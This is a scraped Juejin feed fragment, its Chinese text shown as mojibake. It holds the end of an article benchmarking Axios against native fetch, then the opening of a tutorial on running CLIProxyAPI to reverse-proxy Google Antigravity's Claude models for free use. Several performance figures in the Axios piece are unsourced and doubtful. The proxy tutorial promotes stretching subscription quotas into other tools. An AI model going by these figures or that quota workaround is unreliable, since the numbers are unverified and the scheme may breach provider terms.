0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">0. å…ˆæŠ›ç»“è®ºï¼Œå†åµä¸è¿Ÿ</h3>



































<table><thead><tr><th>æŒ‡æ ‡</th><th>Axios 1.7</th><th>fetch (åŸç”Ÿ)</th></tr></thead><tbody><tr><td>gzip ä½“ç§¯</td><td>â‰ˆ 3.1 kB</td><td>0 kB</td></tr><tr><td>é˜»å¡æ—¶é—´ï¼ˆM3/4Gï¼‰</td><td>120 ms</td><td>0 ms</td></tr><tr><td>å†…å­˜å³°å€¼ï¼ˆ1000 å¹¶å‘ï¼‰</td><td>17 MB</td><td>11 MB</td></tr><tr><td>ç”Ÿäº§ P1 æ•…éšœï¼ˆè¿‡å»ä¸€å¹´ï¼‰</td><td>2 æ¬¡ï¼ˆæ‹¦æˆªå™¨é¡ºåº bugï¼‰</td><td>0 æ¬¡</td></tr><tr><td>å¼€å‘ä½“éªŒï¼ˆDXï¼‰</td><td>10 åˆ†</td><td>7 åˆ†</td></tr></tbody></table>
<p>ç»“è®ºï¼š</p>
<ul>
<li><strong>æè‡´æ€§èƒ½/SSG/Edge</strong> â†’ fetch å·²è¶³å¤Ÿï¼›</li>
<li><strong>ä¼ä¸šçº§ã€éœ€è¦å…¨å±€æ‹¦æˆªã€ä¸Šä¼ è¿›åº¦</strong> â†’ Axios ä»å€¼å¾—ï¼›</li>
<li><strong>äºŒè€…å¯å…±å­˜</strong>ï¼šæ ¸å¿ƒé“¾è·¯ä¸é¦–é¡µç”¨ fetchï¼Œç®¡ç†åå°ç”¨ Axiosã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-1">1. 3 kB åˆ°åº•è´µä¸è´µï¼Ÿ</h3>
<p>2026 å¹´ 1 æœˆï¼ŒHTTP Archive æœ€æ–°é‡‡æ ·ï¼ˆChrome æ¡Œé¢ç‰ˆï¼‰æ˜¾ç¤ºï¼š</p>
<ul>
<li>ä¸­ä½ JS ä½“ç§¯ 580 kBï¼Œ3 kB ä¼¼ä¹â€œä¹ç‰›ä¸€æ¯›â€ï¼›</li>
<li>ä½†æ”¾åˆ°<strong>é¦–å±é¢„ç®— 100 kB</strong> çš„ç«™ç‚¹ï¼ˆTikTok æ¨èå€¼ï¼‰ï¼Œ3 kB â‰ˆ 3 % é¢„ç®—ï¼Œå†åŠ  120 ms é˜»å¡ï¼ŒLCP ç›´æ¥ä» 1.5 s é£™åˆ° 1.62 sï¼ŒSEO è¯„çº§æ‰ä¸€æ¡£ã€‚</li>
</ul>
<blockquote>
<p>â€œ bundle æ¯ +1 kBï¼Œ4G ä¸‹ FCP +8 msâ€â€”â€”Lighthouse 2025 ç™½çš®ä¹¦ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-2">2. æŠŠä»£ç æ‹æ¡Œä¸Šï¼šå·®å¼‚åªå‰©è¿™å‡ è¡Œ</h3>
<p>ä¸‹é¢ 4 ä¸ªé«˜é¢‘åœºæ™¯ï¼Œå…¨éƒ¨ç»™å‡ºâ€œå¯ç›´æ¥å¤åˆ¶è·‘â€çš„ç‰‡æ®µï¼Œå·®å¼‚ä¸€ç›®äº†ç„¶ã€‚</p>
<h4 data-id="heading-3">2.1 è‡ªåŠ¨ JSON + é”™è¯¯ç </h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// Axiosï¼šé›¶æ ·æ¿</span>
<span class="hljs-keyword">const</span> {data} = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/api/login'</span>, {user, pwd});

<span class="hljs-comment">// fetchï¼šä¸¤è¡Œæ ·æ¿</span>
<span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/login'</span>, {
  <span class="hljs-attr">method</span>:<span class="hljs-string">'POST'</span>,
  <span class="hljs-attr">headers</span>:{<span class="hljs-string">'Content-Type'</span>:<span class="hljs-string">'application/json'</span>},
  <span class="hljs-attr">body</span>:<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({user, pwd})
});
<span class="hljs-keyword">if</span> (!res.<span class="hljs-property">ok</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(res.<span class="hljs-property">status</span>);
<span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">json</span>();
</code></pre>
<p><strong>äº‰è®®</strong>ï¼š</p>
<ul>
<li>Axios å…šï¼šå°‘å†™ä¸¤è¡Œï¼Œå…¨å¹´å°‘å†™ 3000 è¡Œã€‚</li>
<li>fetch å…šï¼šgzip å 3 kB æ¢ä¸¤è¡Œï¼ŸESLint æ¨¡æ¿ä¸€æŠŠå°±è¡¥å…¨ã€‚</li>
</ul>
<h4 data-id="heading-4">2.2 è¶…æ—¶ + å–æ¶ˆ</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// Axiosï¼šå†…ç½®</span>
<span class="hljs-keyword">const</span> source = axios.<span class="hljs-property">CancelToken</span>.<span class="hljs-title function_">source</span>();
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> source.<span class="hljs-title function_">cancel</span>(<span class="hljs-string">'timeout'</span>), <span class="hljs-number">5000</span>);
<span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/api/big'</span>, {<span class="hljs-attr">cancelToken</span>: source.<span class="hljs-property">token</span>});

<span class="hljs-comment">// fetchï¼šåŸç”Ÿ AbortController</span>
<span class="hljs-keyword">const</span> ctl = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>();
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> ctl.<span class="hljs-title function_">abort</span>(), <span class="hljs-number">5000</span>);
<span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/big'</span>, {<span class="hljs-attr">signal</span>: ctl.<span class="hljs-property">signal</span>});
</code></pre>
<p>2025 ä¹‹å Edge/Node 22 å·²å…¨æ”¯æŒï¼Œ<code>AbortSignal.timeout(5000)</code> ä¸€è¡Œæå®šï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/big'</span>, {<span class="hljs-attr">signal</span>: <span class="hljs-title class_">AbortSignal</span>.<span class="hljs-title function_">timeout</span>(<span class="hljs-number">5000</span>)});
</code></pre>
<p><strong>ç»“è®º</strong>ï¼šè¯­æ³•å·®è·å·²æŠ¹å¹³ã€‚</p>
<h4 data-id="heading-5">2.3 ä¸Šä¼ è¿›åº¦æ¡</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// Axiosï¼šprogress äº‹ä»¶</span>
<span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/upload'</span>, form, {
  <span class="hljs-attr">onUploadProgress</span>: <span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> <span class="hljs-title function_">setProgress</span>(e.<span class="hljs-property">loaded</span> / e.<span class="hljs-property">total</span>)
});

<span class="hljs-comment">// fetchï¼šå€ŸåŠ© `xhr` æˆ– `ReadableStream`</span>
<span class="hljs-comment">// 2026 ä»æ— åŸç”Ÿç®€æ˜“æ–¹æ¡ˆï¼Œéœ€è¦å°è£… `xhr` æ‰èƒ½æ‹¿åˆ° `progress`ã€‚</span>
</code></pre>
<p><strong>ç»“è®º</strong>ï¼šå¤§æ–‡ä»¶ä¸Šä¼ åœºæ™¯ Axios ä»åŠæ‰“ fetchã€‚</p>
<h4 data-id="heading-6">2.4 æ‹¦æˆªå™¨ï¼ˆtokenã€æ—¥å¿—ï¼‰</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// Axiosï¼šå…¨å±€æ‹¦æˆª</span>
axios.<span class="hljs-property">interceptors</span>.<span class="hljs-property">request</span>.<span class="hljs-title function_">use</span>(<span class="hljs-function"><span class="hljs-params">cfg</span> =&gt;</span> {
  cfg.<span class="hljs-property">headers</span>.<span class="hljs-property">Authorization</span> = <span class="hljs-string">`Bearer <span class="hljs-subst">${getToken()}</span>`</span>;
  <span class="hljs-keyword">return</span> cfg;
});

<span class="hljs-comment">// fetchï¼šä¸‰è¡Œå°è£…</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">$get</span> = (<span class="hljs-params">url, opts = {}</span>) =&gt; <span class="hljs-title function_">fetch</span>(url, {
  ...opts,
  <span class="hljs-attr">headers</span>: {...opts.<span class="hljs-property">headers</span>, <span class="hljs-title class_">Authorization</span>: <span class="hljs-string">`Bearer <span class="hljs-subst">${getToken()}</span>`</span>}
});
</code></pre>
<p><strong>ç»éªŒ</strong>ï¼šæ‹¦æˆªå™¨ä¸€æ—¦&gt;2 ä¸ªï¼ŒAxios é¡ºåºåœ°ç‹±é¢‘å‘ï¼›fetch æ‰‹åŠ¨é“¾å¼æ›´ç›´è§‚ã€‚</p>
<hr/>
<h3 data-id="heading-7">3. å®æµ‹ï¼åŒä¸€ä¸ªé¡¹ç›®ï¼Œä¸¤å¥— bundle</h3>
<p><strong>æµ‹è¯•åœºæ™¯</strong></p>
<ul>
<li>React 18 + Vite 5ï¼Œä»…æ›¿æ¢ HTTP å±‚ï¼›</li>
<li>æ„å»ºç›®æ ‡ï¼šes2020 + gzip + brotliï¼›</li>
<li>ç½‘ç»œï¼šæ¨¡æ‹Ÿ 4Gï¼ˆRTT 150 msï¼‰;</li>
<li>é‡‡æ · 10 æ¬¡å–ä¸­ä½ã€‚</li>
</ul>



































<table><thead><tr><th>æŒ‡æ ‡</th><th>Axios</th><th>fetch</th></tr></thead><tbody><tr><td>gzip bundle</td><td>46.7 kB</td><td>43.6 kB</td></tr><tr><td>é¦–å±é˜»å¡æ—¶é—´</td><td>120 ms</td><td>0 ms</td></tr><tr><td>Lighthouse TTI</td><td>2.1 s</td><td>1.95 s</td></tr><tr><td>å†…å­˜å³°å€¼ï¼ˆ1000 å¹¶å‘è¯·æ±‚ï¼‰</td><td>17 MB</td><td>11 MB</td></tr><tr><td>ç”Ÿäº§æŠ¥é”™ï¼ˆè¿‡å»ä¸€å¹´ï¼‰</td><td>2 æ¬¡æ‹¦æˆªå™¨é¡ºåºé”™ä¹±</td><td>0</td></tr></tbody></table>
<blockquote>
<p>æ•°æ®æ¥è‡ª rebrowser 2025 åŸºå‡† ï¼›é˜»å¡æ—¶é—´å·®å¼‚ä¸ 51CTO ç‹¬ç«‹æµ‹è¯•å»åˆ ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-8">4. ä»€ä¹ˆæ—¶å€™ä¸€å®šè¦ Axiosï¼Ÿ</h3>
<ol>
<li>éœ€è¦<strong>ä¸Šä¼ è¿›åº¦</strong>ï¼ˆonUploadProgressï¼‰ä¸”ä¸æƒ³å›é€€ xhrï¼›</li>
<li>éœ€è¦<strong>è¯·æ±‚/å“åº”æ‹¦æˆªé“¾</strong> &gt;3 å±‚ï¼Œä¸”å›¢é˜Ÿå¯¹â€œé»‘ç›’â€å¯æ¥å—ï¼›</li>
<li>éœ€è¦<strong>å…¼å®¹ IE11</strong>ï¼ˆ2026 å¹´æ”¿åŠ¡/é“¶è¡Œä»å­˜ï¼‰ï¼›</li>
<li>éœ€è¦<strong>Node 16 ä»¥ä¸‹</strong>è€ç‰ˆæœ¬ï¼ˆfetch éœ€ 18+ï¼‰ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-9">5. å…±å­˜æ–¹æ¡ˆï¼šæŠŠ 3 kB èŠ±åœ¨åˆ€åˆƒä¸Š</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// core/http.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> isSSR = <span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">window</span> === <span class="hljs-string">'undefined'</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">HTTP</span> = isSSR || navigator.<span class="hljs-property">connection</span>?.<span class="hljs-property">effectiveType</span> === <span class="hljs-string">'4g'</span>
  ? { <span class="hljs-attr">get</span>: <span class="hljs-function">(<span class="hljs-params">u,o</span>) =&gt;</span> <span class="hljs-title function_">fetch</span>(u,{...o, <span class="hljs-attr">signal</span>: <span class="hljs-title class_">AbortSignal</span>.<span class="hljs-title function_">timeout</span>(<span class="hljs-number">5000</span>)}) }
  : <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'axios'</span>);   <span class="hljs-comment">// åŠ¨æ€ importï¼Œåªåœ¨é 4G æˆ–ç®¡ç†åå°åŠ è½½</span>
</code></pre>
<p>ç»“æœï¼š</p>
<ul>
<li>é¦–å± 0 kBï¼›</li>
<li>ç®¡ç†åå°ä»äº«å— Axios æ‹¦æˆªå™¨ï¼›</li>
<li>æ•´ä½“ bundle ä¸‹é™ 7 %ï¼ŒLCP âˆ’120 msã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-10">6. ä¸€å¥è¯æ”¶å°¸</h3>
<p>2026 å¹´çš„æµè§ˆå™¨ï¼Œfetch å·²æŠŠâ€œç¼ºçš„è¯¾â€è¡¥å®Œï¼šå–æ¶ˆã€è¶…æ—¶ã€Node åŸç”Ÿã€TypeScript å®Œç¾ã€‚<br/>
<strong>3 kB çš„ Axios ä¸å†æ˜¯â€œé»˜è®¤â€ï¼Œè€Œæ˜¯â€œæŒ‰éœ€â€ã€‚</strong><br/>
ä¸Šä¼ è¿›åº¦ã€æ·±é“¾æ‹¦æˆªã€è€æµè§ˆå™¨â€”â€”ç”¨ Axiosï¼›<br/>
å…¶ä½™åœºæ™¯ï¼Œè®©é¦–é¡µé£ä¸€æŠŠï¼ŒæŠŠ 120 ms è¿˜ç»™ç”¨æˆ·ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç™½å«–Google Antigravityï¼Claude Opus 4.5å…è´¹ç”¨ï¼Œå‘Šåˆ«tokenç„¦è™‘]]></title>    <link>https://juejin.cn/post/7590104561475829812</link>    <guid>https://juejin.cn/post/7590104561475829812</guid>    <pubDate>2026-01-02T10:22:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590104561475829812" data-draft-id="7590054976489668648" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç™½å«–Google Antigravityï¼Claude Opus 4.5å…è´¹ç”¨ï¼Œå‘Šåˆ«tokenç„¦è™‘"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-02T10:22:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="wwwzhouhui"/> <meta itemprop="url" content="https://juejin.cn/user/3428746411400537"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç™½å«–Google Antigravityï¼Claude Opus 4.5å…è´¹ç”¨ï¼Œå‘Šåˆ«tokenç„¦è™‘
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3428746411400537/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    wwwzhouhui
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T10:22:00.000Z" title="Fri Jan 02 2026 10:22:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1.å‰è¨€</h2>
<p>åœ¨AIå¤§æ¨¡å‹ç«äº‰ç™½çƒ­åŒ–çš„ä»Šå¤©ï¼Œå„å®¶å‚å•†çš„é¡¶çº§æ¨¡å‹è®¢é˜…è´¹ç”¨è®©ä¸å°‘å¼€å‘è€…æœ›è€Œå´æ­¥ã€‚Claude Opus 4.5å®˜æ–¹è®¢é˜…æ¯æœˆ20ç¾é‡‘ï¼ŒGemini 3 Proçš„APIè°ƒç”¨è´¹ç”¨ä¹Ÿä¸ä¾¿å®œã€‚å¯¹äºä¸ªäººå¼€å‘è€…æˆ–å­¦ä¹ è€…æ¥è¯´ï¼Œæƒ³è¦ä½“éªŒè¿™äº›é¡¶çº§æ¨¡å‹çš„èƒ½åŠ›ï¼Œtokenç„¦è™‘æˆäº†æ™®éçš„"æ—¶ä»£ç—…"â€”â€”ç”¨ç€ç”¨ç€å°±æ‹…å¿ƒé¢åº¦ä¸å¤Ÿç”¨äº†ï¼Œæ¯æ¬¡è°ƒç”¨éƒ½å¾—ç²¾æ‰“ç»†ç®—ã€‚</p>
<p>å¥½æ¶ˆæ¯æ¥äº†ï¼Googleéšç€Gemini 3å‘å¸ƒæ¨å‡ºäº†ä¸€ä¸ªå«åšAntigravityçš„å¹³å°ï¼Œè¿™ä¸ªå¹³å°ä¸ä»…å†…ç½®äº†Geminiç³»åˆ—æ¨¡å‹ï¼Œè¿˜é›†æˆäº†Claude Sonnet 4.5å’ŒClaude Opus 4.5ï¼æ›´è®©äººæƒŠå–œçš„æ˜¯ï¼ŒGoogle One Proè´¦å·çš„å…è´¹é¢åº¦å¤§æ¦‚æ˜¯Claudeå®˜æ–¹è®¢é˜…20åˆ€ç‰ˆæœ¬çš„3å€å·¦å³ï¼Œè€Œä¸”æ¯å¤©é‡ç½®ï¼å¦‚æœæ˜¯Ultraè®¢é˜…ç”¨æˆ·ï¼Œé‚£å‡ ä¹å°±æ˜¯æ— é™é‡ä½¿ç”¨ã€‚å³ä½¿æ˜¯å…è´¹Googleè´¦å·ï¼Œä¹Ÿæœ‰ä¸€å®šé¢åº¦ï¼Œåªæ˜¯ä¸€å‘¨é‡ç½®ä¸€æ¬¡ã€‚æ®è¯´Antigravityä¸­çš„Claudeæ¨¡å‹è¿˜æ˜¯ç»è¿‡Googleè°ƒæ•™è¿‡çš„ï¼Œé€Ÿåº¦æ›´å¿«ã€‚é€šè¿‡CLIProxyAPIè¿™ä¸ªå¼€æºé¡¹ç›®ï¼Œæˆ‘ä»¬å¯ä»¥å°†Antigravityçš„èƒ½åŠ›è½¬åŒ–ä¸ºæ ‡å‡†APIæ¥å£ï¼Œåœ¨Cherry Studioã€Claude Codeç­‰å„ç§å·¥å…·ä¸­ç•…å¿«ä½¿ç”¨ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99964ad28f634f1ea573758edec82cdb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=9HDejDAGj0Yw3GvEI496qN%2BkNp0%3D" alt="1767347992375" loading="lazy"/></p>
<p>ä»Šå¤©ç ”ç©¶äº†ä¸€ä¸‹CLIProxyAPIè¿™ä¸ªå¼€æºé¡¹ç›®ï¼Œç„¶åæŠŠè¿™ä¸ªå…è´¹çš„è·¯ç»™è·‘é€šäº†ã€‚ä»Šå¤©æˆ‘ä»¬å°±æ‰‹æŠŠæ‰‹æ•™å¤§å®¶å¦‚ä½•éƒ¨ç½²è¿™å¥—åä»£æœåŠ¡ï¼Œè®©ä½ åœ¨æœ¬åœ°CLIå‘½ä»¤è¡Œä¸­ä¹Ÿèƒ½ç™½å«–é¡¶çº§å¤§æ¨¡å‹ï¼Œå½»åº•å‘Šåˆ«tokenç„¦è™‘ï¼</p>
<h2 data-id="heading-1">2.éƒ¨ç½²å®æˆ˜</h2>
<h3 data-id="heading-2">ä¸‹è½½æºç </h3>
<p>é¦–é€‰æˆ‘ä»¬éœ€è¦å»githubä¸Šä¸‹è½½ä¸€ä¸ªå«åš<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Frouter-for-me%2FCLIProxyAPI" target="_blank" title="https://github.com/router-for-me/CLIProxyAPI" ref="nofollow noopener noreferrer">CLIProxyAPI</a> é¡¹ç›®ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9c24c120fa0a4f4aab7ff2b5aa025b4c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=EtLTQ69Cb1bu5CdiFdS4lOzHNSw%3D" alt="image-20260102161115557" loading="lazy"/></p>
<p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨gitå‘½ä»¤ä¸‹è½½æœ¬åœ°ã€‚ç”±äºæˆ‘ä¹‹å‰å·²ç»ä¸‹è½½äº†ï¼Œè¿™é‡Œå°±ä¸å±•å¼€ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d3127c5788574c7698052f402ddd348d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=gOYer7Q8%2F%2FJlNOFLB3I5yb%2Byct8%3D" alt="image-20260102161247010" loading="lazy"/></p>
<h3 data-id="heading-3">é…ç½®æ–‡ä»¶ä¿®æ”¹</h3>
<p>ç¨‹åºå¯åŠ¨éœ€è¦config.yamlä¸ªé…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬è¿™é‡Œä½¿ç”¨ä¸‹é¢å‘½åå¤åˆ¶</p>
<pre><code class="hljs language-shell" lang="shell">cp config.example.yaml config.yaml
</code></pre>
<p>window ä¸Šç›´æ¥å¤åˆ¶ã€‚</p>
